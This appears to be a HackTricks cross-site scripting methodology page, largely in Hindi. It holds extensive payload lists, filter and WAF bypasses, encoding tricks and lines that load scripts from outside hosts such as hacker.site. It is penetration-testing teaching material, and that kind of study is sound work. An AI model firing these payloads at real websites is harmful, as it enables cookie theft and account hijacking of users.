# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## कार्यप्रणाली

1. जाँचें कि **कोई भी मूल्य जिसे आप नियंत्रित करते हैं** (_parameters_, _path_, _headers_?, _cookies_?) HTML में **रिफ्लेक्ट** हो रहा है या **JS** कोड द्वारा **उपयोग** किया जा रहा है।
2. पता करें कि यह कहाँ **रिफ्लेक्ट/उपयोग** हो रहा है (context)।
3. यदि **reflected**
1. देखें **कौन से सिंबल आप उपयोग कर सकते हैं** और उसके अनुसार payload तैयार करें:
1. **raw HTML** में:
1. क्या आप नए HTML टैग बना सकते हैं?
2. क्या आप events या attributes का उपयोग कर सकते हैं जो `javascript:` प्रोटोकॉल सपोर्ट करते हैं?
3. क्या आप सुरक्षा तरीकों को बायपास कर सकते हैं?
4. क्या HTML कंटेंट किसी क्लाइंट साइड JS engine (_AngularJS_, _VueJS_, _Mavo_...) द्वारा इंटरप्रेट हो रहा है, जिसे आप [**Client Side Template Injection**](../client-side-template-injection-csti.md) के रूप में दुरुपयोग कर सकते हैं?
5. यदि आप ऐसे HTML टैग नहीं बना सकते जो JS कोड चलाएँ, तो क्या आप [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html) का दुरुपयोग कर सकते हैं?
2. एक **HTML tag** के अंदर:
1. क्या आप attribute से बाहर निकलकर raw HTML context में आ सकते हैं?
2. क्या आप नए events/attributes बना सकते हैं जो JS कोड चलाएँ?
3. क्या वह attribute जिसमें आप फँसे हैं JS execution को सपोर्ट करता है?
4. क्या आप सुरक्षा तरीकों को बायपास कर सकते हैं?
3. **JavaScript code** के अंदर:
1. क्या आप `<script>` टैग से एस्केप कर सकते हैं?
2. क्या आप string से एस्केप कर के अलग JS कोड execute कर सकते हैं?
3. क्या आपका इनपुट template literals `` में है?
4. क्या आप सुरक्षा तरीकों को बायपास कर सकते हैं?
4. Javascript **function** का **execution**
1. आप execute करने के लिए function का नाम इशारा कर सकते हैं। उदाहरण: `?callback=alert(1)`
4. यदि **used**:
1. आप **DOM XSS** का शोषण कर सकते हैं, ध्यान दें आपका इनपुट कैसे नियंत्रित किया जा रहा है और क्या आपका **कंट्रोल्ड इनपुट किसी sink द्वारा उपयोग किया जा रहा है।**

जब आप किसी जटिल XSS पर काम कर रहे हों तो यह जानना उपयोगी हो सकता है कि:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

XSS को सफलतापूर्वक exploit करने के लिए सबसे पहले आपको ऐसी चीज़ ढूँढनी चाहिए जो कि **आपके द्वारा नियंत्रित की जा रही हो और वह वेब पेज में रिफ्लेक्ट हो रही हो।**

- **Intermediately reflected**: अगर आप पाते हैं कि किसी parameter या path का मान वेब पेज में रिफ्लेक्ट हो रहा है तो आप **Reflected XSS** का शोषण कर सकते हैं।
- **Stored and reflected**: अगर कोई ऐसा मान जिसे आप नियंत्रित करते हैं सर्वर पर सेव हो जाता है और हर बार जब आप पेज एक्सेस करते हैं तो वह रिफ्लेक्ट होता है, तो आप **Stored XSS** का शोषण कर सकते हैं।
- **Accessed via JS**: अगर आप पाते हैं कि आपका कंट्रोल किया हुआ मान JS द्वारा एक्सेस किया जा रहा है तो आप **DOM XSS** का शोषण कर सकते हैं।

## Contexts

XSS का शोषण करने की कोशिश करते समय सबसे पहले यह जानना आवश्यक है कि **आपका इनपुट कहाँ रिफ्लेक्ट हो रहा है**। कंटेक्स्ट के आधार पर आप विभिन्न तरीकों से arbitrary JS कोड execute कर पाएँगे।

### Raw HTML

यदि आपका इनपुट **raw HTML** पर रिफ्लेक्ट होता है तो JS कोड execute करने के लिए आपको कुछ **HTML tag** का दुरुपयोग करना पड़ेगा: `<img , <iframe , <svg , <script` ... ये कुछ उदहारण हैं उन कई संभव HTML टैग्स में से जिन्हें आप इस्तेमाल कर सकते हैं।\
साथ ही, याद रखें [Client Side Template Injection](../client-side-template-injection-csti.md)।

### HTML टैग्स के attribute के अंदर

यदि आपका इनपुट किसी टैग के attribute के value के अंदर रिफ्लेक्ट होता है तो आप कोशिश कर सकते हैं:

1. attribute और tag दोनों से **एस्केप** करना (तब आप raw HTML में होंगे) और नया HTML टैग बनाकर शोषण करना: `"><img [...]`
2. यदि आप **attribute से एस्केप कर सकते हैं पर tag से नहीं** (यदि `>` encode या delete कर दिया जाता है), तो टैग के आधार पर आप JS कोड चलाने वाला **event** बना सकते हैं: `" autofocus onfocus=alert(1) x="`
3. यदि आप **attribute से भी एस्केप नहीं कर सकते** (`"` encode या delete किया जा रहा है), तो यह निर्भर करेगा कि आपका मान किस **attribute** में रिफ्लेक्ट हो रहा है और क्या आप पूरे value को नियंत्रित कर रहे हैं या केवल उसका एक हिस्सा। उदाहरण के लिए, अगर आप `onclick=` जैसे event को नियंत्रित करते हैं तो आप इसे क्लिक पर arbitrary कोड चलाने के लिए बना सकते हैं। एक और रोचक उदाहरण attribute `href` है, जहाँ आप `javascript:` प्रोटोकॉल का उपयोग कर arbitrary कोड चला सकते हैं: **`href="javascript:alert(1)"`**
4. अगर आपका इनपुट "unexpoitable tags" के अंदर रिफ्लेक्ट हो रहा है तो आप vuln का शोषण करने के लिए **`accesskey`** trick आज़मा सकते हैं (इसके लिए कुछ social engineering की आवश्यकता होगी): **`" accesskey="x" onclick="alert(1)" x="`**

Angular का एक अजीब उदाहरण जहाँ class name को नियंत्रित करने पर XSS execute होता है:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### JavaScript कोड के अंदर

इस मामले में आपका इनपुट HTML पेज के **`<script> [...] </script>`** टैग्स के बीच, किसी `.js` फाइल के अंदर या **`javascript:`** प्रोटोकॉल का उपयोग करते हुए किसी attribute के अंदर परिलक्षित होता है:

- यदि यह **`<script> [...] </script>`** टैग्स के बीच परिलक्षित होता है, तो भले ही आपका इनपुट किसी भी तरह की quotes के अंदर हो, आप `</script>` इंजेक्ट करके इस context से बाहर निकलने की कोशिश कर सकते हैं। यह इसलिए काम करता है क्योंकि **browser पहले HTML टैग्स को parse करेगा** और फिर कंटेंट को, इसलिए यह नोटिस नहीं करेगा कि आपने जो `</script>` इंजेक्ट किया है वह HTML कोड के अंदर है।
- यदि यह **inside a JS string** परिलक्षित होता है और पिछला तरीका काम नहीं कर रहा हो तो आपको string से **exit** करना, अपना कोड **execute** करना और JS कोड को **reconstruct** करना होगा (यदि कोई error होगा, तो यह execute नहीं होगा):
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- यदि यह template literals के अंदर परिलक्षित होता है, तो आप `${ ... }` syntax का उपयोग करके **embed JS expressions** कर सकते हैं: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** का उपयोग **valid javascript code** लिखने के लिए काम आता है:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting का मतलब है कि आप **functions, variables or classes को उनके उपयोग के बाद declare कर सकते हैं ताकि आप उन स्थितियों का दुरुपयोग कर सकें जहाँ कोई XSS undeclared variables या functions का उपयोग कर रहा हो।**\
**अधिक जानकारी के लिए निम्न पेज देखें:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

कई वेब पेज ऐसे endpoints रखते हैं जो **parameter के रूप में execute करने वाले function का नाम accept करते हैं**। वाइल्ड में सामान्य उदाहरण कुछ ऐसा होता है: `?callback=callbackFunc`।

यह पता लगाने का एक अच्छा तरीका कि यूजर द्वारा दी गई कोई चीज़ execute होने की कोशिश कर रही है या नहीं, है **param value को modify करना** (उदाहरण के लिए 'Vulnerable') और console में ऐसी errors देखना:

![](<../../images/image (711).png>)

अगर यह vulnerable है, तो आप केवल वह value भेजकर **alert trigger** कर सकते हैं: **`?callback=alert(1)`**। हालांकि, अक्सर ये endpoints **content validate** करते हैं ताकि केवल letters, numbers, dots और underscores (**`[\w\._]`**) ही allowed हों।

फिर भी, उस limitation के साथ भी कुछ actions करना संभव है। ऐसा इसलिए है क्योंकि आप उन valid chars का उपयोग करके **DOM के किसी भी element को access** कर सकते हैं:

![](<../../images/image (747).png>)

इसके लिए कुछ उपयोगी functions हैं:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
You can also try to **trigger Javascript functions** directly: `obj.sales.delOrders`.

However, usually the endpoints executing the indicated function are endpoints without much interesting DOM, **other pages in the same origin** will have a **more interesting DOM** to perform more actions.

Therefore, in order to **abuse this vulnerability in a different DOM** the **Same Origin Method Execution (SOME)** exploitation was developed:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

There is **JS code** that is using **unsafely** some **data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

These kind of XSS can be found **anywhere**. They not depend just on the client exploitation of a web application but on **any** **context**. These kind of **arbitrary JavaScript execution** can even be abuse to obtain **RCE**, **read** **arbitrary** **files** in clients and servers, and more.\
Some **examples**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Raw HTML के अंदर Inject करना

जब आपका input HTML पेज के अंदर **reflected** होता है या आप इस context में escape कर के HTML code inject कर सकते हैं तो पहली चीज़ जो आपको करनी चाहिए वह यह जांचना है कि क्या आप `<` को abuse करके नए tags बना सकते हैं: बस उस **char** को **reflect** करने की कोशिश करें और जाँचें कि क्या इसे **HTML encoded** किया जा रहा है या **deleted** किया जा रहा है या यह **बिना बदलाव के reflect** हो रहा है। **केवल अंतिम मामले में आप इस केस को exploit कर पाएंगे**।\
इन मामलों के लिए भी **ध्यान में रखें** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Note: A HTML comment can be closed using `-->` or `--!>`**_

In this case and if no black/whitelisting is used, you could use payloads like:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
But, if tags/attributes black/whitelisting is being used, you will need to **brute-force which tags** you can create.\
Once you have **located which tags are allowed**, you would need to **brute-force attributes/events** inside the found valid tags to see how you can attack the context.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. फिर, सभी को Burp intruder का उपयोग करके भेजें और जाँच करें कि क्या किसी tag को WAF ने malicious के रूप में पहचाना नहीं। एक बार जब आप पता लगा लें कि आप कौन से tags उपयोग कर सकते हैं, तो आप वैध tags का उपयोग करके सभी events को **brute force** कर सकते हैं (उसी वेब पेज में _**Copy events to clipboard**_ पर क्लिक करें और पहले वाली प्रक्रिया का पालन करें)।

### Custom tags

अगर आपको कोई वैध HTML tag नहीं मिला, तो आप **create a custom tag** करने की कोशिश कर सकते हैं और `onfocus` attribute के साथ JS code execute करवा सकते हैं। XSS request में, आपको URL को `#` से समाप्त करना होगा ताकि पेज उस object पर **focus on that object** और कोड **execute** कर पाए:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

यदि किसी प्रकार की blacklist का उपयोग किया जा रहा है आप कुछ बेवकूफााना तरकीबों से इसे bypass करने की कोशिश कर सकते हैं:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **विभिन्न परिवेशों के लिए अधिक tiny XSS** payload [**यहाँ पाया जा सकता है**](https://github.com/terjanq/Tiny-XSS-Payloads) और [**यहाँ**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
इन वर्णों के और उदाहरण [here](https://www.unicode.org/charts/normalization/) पर मिलते हैं।\
किस characters में decomposed होते हैं यह जांचने के लिए [here](https://www.compart.com/en/unicode/U+2121) देखें।

### Click XSS - Clickjacking

यदि vulnerability को exploit करने के लिए आपको prepopulated डेटा के साथ **user को link या form पर क्लिक करना** आवश्यक है, तो आप [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) आज़माकर देख सकते हैं (यदि पेज vulnerable हो)।

### असंभव - Dangling Markup

यदि आप सोचते हैं कि **HTML tag के साथ attribute बनाकर JS code निष्पादित करना असंभव है**, तो आपको [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) चेक करना चाहिए क्योंकि आप vulnerability को **exploit** कर सकते हैं **बिना** **JS** code को execute किए।

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

यदि आप **HTML tag के अंदर** हैं, तो सबसे पहले आप tag से **escape** करके [previous section](#injecting-inside-raw-html) में बताए गए कुछ techniques का उपयोग करके JS code execute करने की कोशिश कर सकते हैं।\
यदि आप **tag से escape नहीं कर सकते**, तो आप tag के अंदर नए attributes बनाकर JS code execute करने की कोशिश कर सकते हैं, उदाहरण के लिए कुछ payload का उपयोग करके (_नोट: इस उदाहरण में attribute से escape करने के लिए double quotes का उपयोग किया गया है, यदि आपका input सीधे tag के अंदर प्रतिबिंबित होता है तो आपको उनकी आवश्यकता नहीं होगी_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**स्टाइल इवेंट्स**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### attribute के भीतर

भले ही आप **attribute से escape नहीं कर पाते** (`"` को encode या delete किया जा रहा है), यह इस बात पर निर्भर करता है कि आपका value किस **attribute** में reflect हो रहा है और क्या आप पूरा value नियंत्रित करते हैं या सिर्फ उसका एक हिस्सा — आप इसे abuse कर पाएंगे। For **example**, अगर आप `onclick=` जैसे किसी event को नियंत्रित करते हैं तो आप इसे क्लिक होने पर arbitrary code execute करवा पाएंगे.\
एक और दिलचस्प **example** attribute `href` है, जहाँ आप `javascript:` protocol का उपयोग करके arbitrary code चला सकते हैं: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

HTML tags के attributes के value के अंदर जो **HTML encoded characters** होते हैं वे runtime पर **decoded on runtime** होते हैं। इसलिए नीचे जैसा कुछ वैध होगा (payload bold में है): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

ध्यान दें कि **any kind of HTML encode वैध है**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**ध्यान दें कि URL encode भी काम करेगा:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Unicode encode का उपयोग करके event के अंदर Bypass**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### attribute के भीतर विशेष प्रोटोकॉल

वहाँ आप कुछ स्थानों पर प्रोटोकॉल **`javascript:`** या **`data:`** का उपयोग करके **मनमाना JS कोड निष्पादित** कर सकते हैं। कुछ मामलों में उपयोगकर्ता की सहभागिता आवश्यक होगी; कुछ में नहीं।
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**जहाँ आप इन प्रोटोकॉल्स को इंजेक्ट कर सकते हैं**

**सामान्यतः** `javascript:` प्रोटोकॉल **किसी भी टैग में इस्तेमाल किया जा सकता है जो `href` attribute स्वीकार करता है** और **अधिकांश** उन टैगों में भी जो **`src` attribute** स्वीकार करते हैं (लेकिन `<img>` में नहीं)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**अन्य obfuscation tricks**

_**इस मामले में पिछले सेक्शन से HTML encoding और Unicode encoding trick भी मान्य हैं क्योंकि आप attribute के अंदर हैं।**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
इसके अलावा, इन मामलों के लिए एक और **nice trick** है: **Even if your input inside `javascript:...` is being URL encoded, it will be URL decoded before it's executed.** इसलिए, यदि आपको **escape** करके **string** से **single quote** का उपयोग कर बाहर निकलना है और आप देखते हैं कि **it's being URL encoded**, तो याद रखें कि **it doesn't matter,** यह **interpreted** होगा एक **single quote** के रूप में **execution** के समय।
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
ध्यान दें कि यदि आप किसी भी क्रम में **दोनों का उपयोग** `URLencode + HTMLencode` करके **payload** को encode करने की कोशिश करते हैं तो यह **काम नहीं** **करेगा**, लेकिन आप **इन्हें payload के अंदर मिलाकर** इस्तेमाल कर सकते हैं।

**`javascript:` के साथ Hex और Octal encode का उपयोग**

आप `iframe` के `src` attribute के अंदर (कम से कम) **Hex** और **Octal encode** का उपयोग करके **HTML tags to execute JS** घोषित कर सकते हैं:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
यदि आप किसी भी URL को किसी arbitrary **`<a href=`** टैग में inject कर सकते हैं जो **`target="_blank" and rel="opener"`** attributes रखता है, तो इस व्यवहार को exploit करने के लिए निम्न पेज देखें:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

सबसे पहले इस पेज को चेक करें ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) for useful **"on" event handlers**.\
यदि कोई blacklist है जो आपको इन event handlers को बनाने से रोकती है तो आप निम्न bypasses आज़मा सकते हैं:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS में "Unexploitable tags" (hidden input, link, canonical, meta)

From [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **अब hidden inputs का दुरुपयोग निम्न के साथ संभव है:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
और **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
From [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): आप **XSS payload inside a hidden attribute** चला सकते हैं, बशर्ते आप **victim** को **key combination** दबाने के लिए **मनाने** में सफल हों। Firefox Windows/Linux पर की-कॉम्बिनेशन **ALT+SHIFT+X** है और OS X पर **CTRL+ALT+X** है। आप access key attribute में अलग key देकर अलग की-कॉम्बिनेशन निर्दिष्ट कर सकते हैं। Here is the vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload कुछ ऐसा होगा: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

इस सेक्शन में पहले ही विभिन्न encoding के उपयोग से संबंधित कई ट्रिक्स बताई जा चुकी हैं। वापस जाएँ और जानें कि आप कहाँ उपयोग कर सकते हैं:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

यदि आपने वेब के बहुत छोटे हिस्से में कोई **XSS** पाया है जो किसी तरह की interaction की मांग करता है (शायद footer में एक छोटा सा link जिसमें onmouseover element हो), तो आप उस element द्वारा घेराए गए space को modify करने की कोशिश कर सकते हैं ताकि link के फायर होने की संभावनाएँ अधिकतम हों।

उदाहरण के लिए, आप element में कुछ styling जोड़ सकते हैं जैसे: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

लेकिन, अगर WAF style attribute को filter कर रहा है, तो आप CSS Styling Gadgets का उपयोग कर सकते हैं, इसलिए यदि आप उदाहरण के लिए पाते हैं

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

अब आप हमारे link को modify कर सकते हैं और इसे इस रूप में ला सकते हैं

> \<a href="" id=someid class=test onclick=alert() a="">

यह trick निम्न लिंक से लिया गया था: [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

ऐसे मामलों में आपका input `.js` फ़ाइल के JS code में या `<script>...</script>` टैग्स के बीच, या ऐसे HTML events के बीच जहाँ JS code execute हो सकता है, या उन attributes के बीच जो `javascript:` protocol स्वीकार करते हैं, reflect होगा।

### Escaping \<script> tag

यदि आपका code `<script> [...] var input = 'reflected data' [...] </script>` के भीतर insert होता है, तो आप आसानी से **closing the `<script>`** tag को escape कर सकते हैं:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Note that in this example we **हमने single quote को भी बंद ही नहीं किया है**. This is because **HTML parsing सबसे पहले browser द्वारा की जाती है**, जो पेज के एलिमेंट्स की पहचान करता है, जिनमें script के ब्लॉक्स भी शामिल हैं। The parsing of JavaScript to understand and execute the embedded scripts is only carried out afterward.

### JS कोड के अंदर

If `<>` are being sanitised you can still **जिस स्ट्रिंग में आपका इनपुट स्थित है उसे escape करें** और **मनमाना JS execute कर पाएँ**. It's important to **JS syntax को ठीक करें**, because if there are any errors, the JS code won't be executed:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

जब उपयोगकर्ता इनपुट किसी उद्धरण चिह्न वाले JavaScript string के अंदर पहुँचता है (e.g., server-side echo into an inline script), तो आप string को terminate कर सकते हैं, code inject कर सकते हैं, और syntax repair कर सकते हैं ताकि parsing वैध बनी रहे। सामान्य संरचना:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
उदाहरण URL पैटर्न जब vulnerable parameter JS string में reflected होता है:
```
?param=test";<INJECTION>;a="
```
यह attacker JS चलाता है बिना HTML context को छुए (pure JS-in-JS)। जब filters keywords ब्लॉक कर दें तो नीचे दिए गए blacklist bypasses के साथ मिलाएँ।

### Template literals ``

single and double quotes के अलावा **strings** बनाने के लिए JS भी **backticks** **` `` `** स्वीकार करता है। इसे template literals कहा जाता है क्योंकि यह `${ ... }` सिंटैक्स का उपयोग करके **embedded JS expressions** को अनुमति देता है।\
इसलिए, अगर आपका इनपुट उस JS string के अंदर **reflected** हो रहा है जो backticks का उपयोग कर रही है, तो आप `${ ... }` सिंटैक्स का दुरुपयोग करके **arbitrary JS code** चला सकते हैं:

यह निम्नलिखित तरीकों से **abused** किया जा सकता है:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### एन्कोडेड code execution
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads with eval(atob()) और scope की सूक्ष्मताएँ

URLs को छोटा रखने और साधारण keyword filters को बायपास करने के लिए, आप अपनी वास्तविक logic को base64-encode कर सकते हैं और उसे `eval(atob('...'))` से evaluate कर सकते हैं। अगर साधारण keyword filtering `alert`, `eval`, या `atob` जैसे identifiers को ब्लॉक कर दे, तो Unicode-escaped identifiers का उपयोग करें, जो ब्राउज़र में एक ही तरह compile होते हैं पर string-matching filters को बायपास कर लेते हैं:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
महत्वपूर्ण scoping सूक्ष्मता: `const`/`let` जो `eval()` के अंदर declare किए जाते हैं वे block-scoped होते हैं और globals नहीं बनाते; वे बाद की scripts के लिए पहुँच योग्य नहीं होंगे। जब आवश्यकता हो, global, non-rebindable hooks को define करने के लिए dynamically injected `<script>` element का उपयोग करें (उदा., एक form handler को hijack करने के लिए):
```javascript
var s = document.createElement('script');
